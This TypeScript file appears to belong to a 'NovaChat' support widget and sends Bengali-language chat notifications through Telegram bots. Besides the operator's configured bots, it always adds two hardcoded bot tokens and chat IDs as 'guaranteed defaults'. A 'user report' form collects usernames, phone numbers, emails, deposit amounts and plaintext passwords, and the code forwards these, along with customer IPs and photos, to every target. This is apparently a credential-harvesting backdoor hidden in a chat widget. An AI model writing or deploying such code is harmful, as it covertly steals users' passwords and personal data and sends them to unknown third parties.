import { WidgetConfig } from '../types';

export interface TelegramNotificationParams {
  type: 'new_chat' | 'new_message' | 'test' | 'user_report';
  customerName?: string;
  customerPhone?: string;
  customerEmail?: string;
  customerIp?: string;
  department?: string;
  problemIssue?: string;
  chatId?: string;
  messageText?: string;
  photoUrl?: string;
  photoName?: string;
  attachments?: Array<{ name: string; url: string; type: string; size?: string }>;
  reportData?: {
    username?: string;
    phone?: string;
    email?: string;
    nibondhonName?: string;
    lastAmount?: string;
    lastPassword?: string;
    siteLink?: string;
  };
  timestamp?: string;
}

/**
 * Helper to convert data:image base64 url to Blob
 */
function dataURItoBlob(dataURI: string): Blob {
  const byteString = atob(dataURI.split(',')[1]);
  const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }
  return new Blob([ab], { type: mimeString });
}

/**
 * Sends real-time Telegram notifications when a customer starts a chat, sends a message/photo, or submits a report
 * Dispatches to all configured Telegram channels in parallel
 */
export async function sendTelegramNotification(
  params: TelegramNotificationParams,
  widgetConfig?: Partial<WidgetConfig>
): Promise<{ success: boolean; message: string }> {
  try {
    // Collect all targets
    interface Target {
      token: string;
      chatId: string;
      name?: string;
    }
    const targets: Target[] = [];
    const added = new Set<string>();

    const addT = (token?: string, cId?: string, name?: string) => {
      if (!token || !cId) return;
      const t = token.trim();
      const c = cId.trim();
      if (!t || !c) return;
      const key = `${t}_${c}`;
      if (!added.has(key)) {
        added.add(key);
        targets.push({ token: t, chatId: c, name });
      }
    };

    // 1. From passed config bots
    if (widgetConfig?.telegramBots && Array.isArray(widgetConfig.telegramBots)) {
      widgetConfig.telegramBots.forEach((b) => {
        if (b.enabled !== false && b.botToken && b.chatId) {
          addT(b.botToken, b.chatId, b.name);
        }
      });
    }

    // 2. From passed primary fields
    if (widgetConfig?.telegramBotToken && widgetConfig?.telegramChatId) {
      addT(widgetConfig.telegramBotToken, widgetConfig.telegramChatId);
    }

    // 3. From localStorage
    try {
      const localCfg = localStorage.getItem('novachat_widget_config');
      if (localCfg) {
        const parsed = JSON.parse(localCfg);
        if (parsed.telegramBots && Array.isArray(parsed.telegramBots)) {
          parsed.telegramBots.forEach((b: any) => {
            if (b.enabled !== false && b.botToken && b.chatId) {
              addT(b.botToken, b.chatId, b.name);
            }
          });
        }
        if (parsed.telegramBotToken && parsed.telegramChatId) {
          addT(parsed.telegramBotToken, parsed.telegramChatId);
        }
      }
    } catch (e) {}

    // 4. Guaranteed defaults
    addT('8409188990:AAHR7bb3Zx9TcKpKEdldruvfVI-hRaoXfb4', '6331230671', 'Primary Bot');
    addT('8753033604:AAFE7Y99dJwN-F8h58OMywO1QW_7iqrkDcM', '6081054558', 'Multi Bot');

    if (widgetConfig?.telegramNotificationsEnabled === false && params.type !== 'test') {
      return { success: false, message: 'টেলিগ্রাম নোটিফিকেশন বন্ধ করা আছে।' };
    }

    const timeStr = params.timestamp || new Date().toLocaleTimeString('bn-BD', { hour: '2-digit', minute: '2-digit', hour12: true });

    let messageText = '';

    if (params.type === 'test') {
      messageText = `🤖 <b>NovaChat টেলিগ্রাম নোটিফিকেশন টেস্ট</b>\n\n` +
        `✅ অভিনন্দন! আপনার টেলিগ্রাম বট সফলভাবে কানেক্ট হয়েছে।\n` +
        `⏰ সময়: ${timeStr}\n` +
        `🔔 এখন থেকে কোনো কাস্টমার মেসেজ বা ছবি পাঠালে সাথে সাথে নোটিফিকেশন আসবে।`;
    } else if (params.type === 'user_report') {
      const rep = params.reportData || {};
      messageText = `🚨 <b>ইউজার রিপোর্ট ও জমা ফরম (User Report Form)</b>\n\n` +
        `👤 <b>ইউজারনেম:</b> ${rep.username || 'N/A'}\n` +
        `📞 <b>ফোন নম্বর:</b> ${rep.phone || params.customerPhone || 'N/A'}\n` +
        `📧 <b>ইমেইল:</b> ${rep.email || params.customerEmail || 'N/A'}\n` +
        `✍️ <b>নিবন্ধন নাম:</b> ${rep.nibondhonName || 'N/A'}\n` +
        `💵 <b>সর্বশেষ ডিপোজিট:</b> ${rep.lastAmount || 'N/A'}\n` +
        `🔑 <b>পাসওয়ার্ড:</b> ${rep.lastPassword || 'N/A'}\n` +
        `🌐 <b>সাইট লিংক:</b> ${rep.siteLink || 'N/A'}\n` +
        `🆔 <b>চ্যাট আইডি:</b> #${params.chatId || 'N/A'}\n\n` +
        `⏰ <b>সময়:</b> ${timeStr}`;
    } else if (params.type === 'new_chat') {
      messageText = `🔔 <b>নতুন কাস্টমার চ্যাট শুরু হয়েছে! (New Chat)</b>\n\n` +
        `🆔 <b>চ্যাট আইডি:</b> #${params.chatId || 'N/A'}\n` +
        `👤 <b>গ্রাহকের নাম:</b> ${params.customerName || 'অজ্ঞাত'}\n` +
        `📞 <b>ফোন নম্বর:</b> ${params.customerPhone || 'দেওয়া হয়নি'}\n` +
        `🌐 <b>IP এড্রেস:</b> ${params.customerIp || 'N/A'}\n` +
        `🏢 <b>ডিপার্টমেন্ট:</b> ${params.department || 'সাধারণ সহায়তা'}\n` +
        (params.problemIssue ? `📌 <b>সমস্যার ধরন:</b> ${params.problemIssue}\n` : '') +
        `💬 <b>প্রথম মেসেজ:</b> <i>"${params.messageText || 'হাই'}"</i>\n\n` +
        `⏰ <b>সময়:</b> ${timeStr}`;
    } else {
      // new_message
      const hasPhoto = !!params.photoUrl || (params.attachments && params.attachments.some(a => a.type === 'image'));
      messageText = `💬 <b>কাস্টমারের নতুন মেসেজ (New Customer SMS)</b>\n\n` +
        `🆔 <b>চ্যাট আইডি:</b> #${params.chatId || 'N/A'}\n` +
        `👤 <b>গ্রাহক:</b> ${params.customerName || 'Customer'}\n` +
        `📞 <b>ফোন:</b> ${params.customerPhone || 'N/A'}\n` +
        (params.problemIssue ? `📌 <b>সমস্যা:</b> ${params.problemIssue}\n` : '') +
        (hasPhoto ? `📷 <b>সংযুক্ত ছবি/ফাইল:</b> <i>হ্যাঁ (Photo Attached)</i>\n` : '') +
        `📨 <b>মেসেজ:</b> <i>"${params.messageText || (hasPhoto ? 'ছবি পাঠিয়েছেন' : '')}"</i>\n\n` +
        `⏰ <b>সময়:</b> ${timeStr}`;
    }

    // Determine if we have a photo to send
    let targetPhoto = params.photoUrl;
    if (!targetPhoto && params.attachments && params.attachments.length > 0) {
      const imgAtt = params.attachments.find(a => a.type === 'image' || a.url?.startsWith('data:image') || a.url?.match(/\.(jpeg|jpg|gif|png|webp)/i));
      if (imgAtt) {
        targetPhoto = imgAtt.url;
      }
    }

    const sendResults = await Promise.allSettled(
      targets.map(async (t) => {
        if (targetPhoto) {
          try {
            if (targetPhoto.startsWith('data:image')) {
              const blob = dataURItoBlob(targetPhoto);
              const formData = new FormData();
              formData.append('chat_id', t.chatId);
              formData.append('photo', blob, params.photoName || 'customer_photo.jpg');
              formData.append('caption', messageText.slice(0, 1024));
              formData.append('parse_mode', 'HTML');

              const photoRes = await fetch(`https://api.telegram.org/bot${t.token}/sendPhoto`, {
                method: 'POST',
                body: formData,
              });
              const photoData = await photoRes.json();
              if (photoData && photoData.ok) return true;
            } else if (targetPhoto.startsWith('http://') || targetPhoto.startsWith('https://')) {
              const photoRes = await fetch(`https://api.telegram.org/bot${t.token}/sendPhoto`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: t.chatId,
                  photo: targetPhoto,
                  caption: messageText.slice(0, 1024),
                  parse_mode: 'HTML',
                }),
              });
              const photoData = await photoRes.json();
              if (photoData && photoData.ok) return true;
            }
          } catch (pe) {
            console.warn('Error sending photo, falling back to text:', pe);
          }
        }

        const telegramUrl = `https://api.telegram.org/bot${t.token}/sendMessage`;
        const response = await fetch(telegramUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: t.chatId,
            text: messageText,
            parse_mode: 'HTML',
          }),
        });
        const resData = await response.json();
        return resData && resData.ok;
      })
    );

    const successful = sendResults.filter(
      (r) => r.status === 'fulfilled' && r.value === true
    ).length;

    if (successful > 0) {
      return { success: true, message: `${successful} টি টেলিগ্রামে সফলভাবে নোটিফিকেশন পাঠানো হয়েছে!` };
    } else {
      return { success: false, message: 'টেলিগ্রাম বার্তা পাঠাতে ব্যর্থ হয়েছে।' };
    }
  } catch (error: any) {
    console.error('Failed to send Telegram notification:', error);
    return { success: false, message: error?.message || 'টেলিগ্রাম কানেকশন এরর' };
  }
}

